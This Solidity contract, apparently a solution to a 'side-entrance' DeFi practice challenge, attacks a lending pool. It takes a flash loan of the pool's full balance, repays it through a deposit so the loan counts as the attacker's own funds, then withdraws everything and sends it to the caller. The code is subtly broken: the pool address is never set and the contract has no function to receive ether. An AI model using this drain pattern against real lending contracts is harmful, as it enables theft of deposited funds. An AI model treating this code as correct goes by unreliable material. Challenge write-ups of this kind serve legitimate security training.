// SPDX-License-Identifier: MIT
 pragma solidity 0.8.25;

 import "../side-entrance/SideEntranceLenderPool.sol";

 contract AttackSideEntrance {
    SideEntranceLenderPool pool;
    function attack() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() external payable{
        pool.deposit{value: msg.value}();
    }
 }